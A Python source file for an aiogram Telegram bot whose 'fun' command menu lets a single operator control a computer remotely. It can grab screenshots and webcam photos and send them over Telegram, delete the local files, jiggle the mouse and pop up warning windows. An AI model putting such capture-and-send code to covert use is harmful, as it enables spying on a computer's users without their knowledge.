import os
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import ReplyKeyboardRemove, ReplyKeyboardMarkup
from aiogram import types, Dispatcher
from aiogram.dispatcher import FSMContext
from Handlers.handlers import bot, dp, identify
from Funcs import funcs
from Keyboardz.keyboard_fun import *
from Funcs.state import return_message
from message_processing import fun_messages as fs
from Funcs import fun_commands

storage = MemoryStorage()


class statecomand(StatesGroup):
    commandforfun = State()
    zadacha = State()


async def menu_fun(message: types.Message):
    if (message.from_id != identify):
        await bot.send_message(message.from_user.id, "Неправильная команда")
    else:
        await statecomand.commandforfun.set()
        await bot.send_message(identify, "Глава интересное. Выберите действие", reply_markup=keyBoard_funs)


@dp.message_handler(state=statecomand.commandforfun)
async def fun_command(message: types.Message, state: FSMContext):

    async with state.proxy() as data:
        data['choosen'] = message.text

    if data['choosen'] == "Скриншот экрана":
        fun_commands.Fun_funcs.screenshot()
        photo = open(f'{funcs.PATH}ss.png', 'rb')
        await bot.send_photo(identify, photo)
        os.remove(f'{funcs.PATH}ss.png')
        await bot.send_message(identify, return_message("Скриншот готов\n"))
        await state.finish()
    
    elif data['choosen'] == "Фото с камеры":
        fun_commands.Fun_funcs.get_photo_from_camera()
        photo = open(f'{funcs.PATH}cam.png', 'rb')
        await bot.send_photo(identify, photo)
        os.remove(f'{funcs.PATH}cam.png')
        await bot.send_message(identify, return_message("Фото готово\n"))
        await state.finish()

    elif data['choosen'] == "Вывод окна":
        await bot.send_message(identify, fs.Funs_messages.fun_segment(message.text), reply_markup=keyboard_wybor)
        await statecomand.next()
        await statecomand.zadacha.set()

    else:
        await bot.send_message(identify, fs.Funs_messages.fun_segment(data['choosen']))
        await statecomand.next()
        await statecomand.zadacha.set()

    ReplyKeyboardRemove.remove_keyboard = True


@dp.message_handler(state=statecomand.zadacha)
async def second(message: types.Message, state: FSMContext):

    async with state.proxy() as data:
        data['values'] = message.text

    if (data['choosen'] == "Рандом с мышкой"):
        hren = data['values']
        fun_commands.Fun_funcs.mouse_rand(hren)
        await bot.send_message(identify, return_message(f"Процесс готово.\n"))

    elif (data['choosen'] == "Вывод окна"):
        hren = data['values']
        fun_commands.Fun_funcs.window_warning(hren)
        await bot.send_message(identify, return_message(f"Процесс готово.\n"))

    ReplyKeyboardRemove.remove_keyboard = True

    await state.finish()


def register_handler_fun_command(dp: Dispatcher):
    dp.register_message_handler(menu_fun, commands=['funfun'])
